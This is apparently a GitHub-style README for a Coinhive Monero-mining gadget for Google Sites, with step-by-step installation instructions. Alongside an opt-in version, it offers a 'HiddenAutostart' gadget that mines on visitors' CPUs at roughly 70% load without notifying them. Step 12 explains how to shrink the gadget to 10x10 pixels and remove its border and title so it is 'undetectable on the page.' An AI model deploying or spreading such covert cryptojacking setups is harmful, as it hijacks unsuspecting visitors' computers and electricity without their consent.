# Coinhive Google Sites Gadget
A [Coinhive](https://coinhive.com/) Monero mining Gadget for Google Sites.

This is the Google Site I used for the pictures in the installation guide: [https://sites.google.com/site/coinhivegadgettutorial/](https://sites.google.com/site/coinhivegadgettutorial/)

## HiddenAutostart Gadget:
 Not visible on the page and does not notify the client visiting the webpage.
## OptIn Gadget: 
 Requires the client to click start and allows the user change speed (throttle) and amount of CPU threads used for mining.

# How to Install
1. Download which gadget you want.
2. Edit the XML file and replace the Coinhive Site Public key. Mine is: **M7RVhmPbPET48OxR5fLku1Xe2WkNo5w0**
3. **Optional** Change the throttle value to increase or decrease the impact of the mining gadget on the client's computer. The default throttle is 0.3 which translates to 30%. With a throttle of 30% the clients CPU will be running at **70%**.
4. Once you have your final XML file, go to your Google Site dashboard and click on "Manage Site".

7. Look at where the file is located. If you uploaded the file to a different place then the path to the file will be different. If you don't upload the file to a folder the default location is "/". This is important for when you add the gadget to a page on your site.

10. Click on "Add gadget by URL". Delete the "http://" that is filled in for you. Then copy the URL of your website and add the location of the file from step 7 to the end of the URL. Since our file is uploaded to the default location of "/" we just need to make sure there is a single / at the end of the URL.

11. Now add the file name of the gadget to the URL right after the "/". Make sure what you add to the end of the URL is the same as the name of the file in the "Attachments" menu where you uploaded the file. **You have to include the file extension. In our case it is .xml**. Then click "Add".

12. A new window will appear with the gadget settings. **If you are using the HiddenAutostart gadget follow these instructions:** Set "Width" to 10 and click the box "Percent" and change it to "pixels". Set the "Height" to 10. **Uncheck** the boxes "Include a border around gadget" and "Display title on gadget". This will make your gadget undetectable on the page. **If you are using the OptIn gadget follow these instructions:** Depending on the other content on your page you might want to play around with the settings for "Width" and "Height". But **Uncheck** the box for "Include a border around gadget". You can include a title if you want.

Picture is for the **HiddenAutostart gadget**.
